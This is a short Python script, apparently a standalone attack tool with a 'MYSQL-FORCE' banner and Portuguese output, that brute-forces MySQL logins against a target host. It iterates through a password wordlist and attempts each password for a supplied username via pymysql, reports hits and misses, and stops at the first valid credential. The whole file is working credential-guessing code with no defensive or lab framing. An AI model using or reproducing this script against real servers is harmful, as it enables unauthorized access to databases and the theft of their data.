import argparse
import pymysql
import pyfiglet

result = pyfiglet.figlet_format("MYSQL-FORCE")
print(result)

def mysql_bruteforce(host, username, password):
    try:

        conn = pymysql.connect(host=host, user=username, password=password)
        print(f"[+] Login encontrado - Usuário: {username}, Senha: {password}")
        conn.close()
        return True
    except pymysql.err.OperationalError as e:
        print(f"[-] Login não encontrado - Usuário: {username}, Senha: {password}")
        return False

def main():
    parser = argparse.ArgumentParser(description='MySQL Brute Force Script')
    parser.add_argument('-u', '--username', dest='username', required=True, help='Nome de usuário MySQL')
    parser.add_argument('host', help='Endereço IP do servidor MySQL')
    parser.add_argument('-w', '--wordlist', dest='wordlist', required=True, help='Caminho para o arquivo de wordlist de senhas')
    args = parser.parse_args()

    with open(args.wordlist, 'r') as file:
        for password in file:
            password = password.strip()
            if mysql_bruteforce(args.host, args.username, password):
                break

if __name__ == "__main__":
    main()
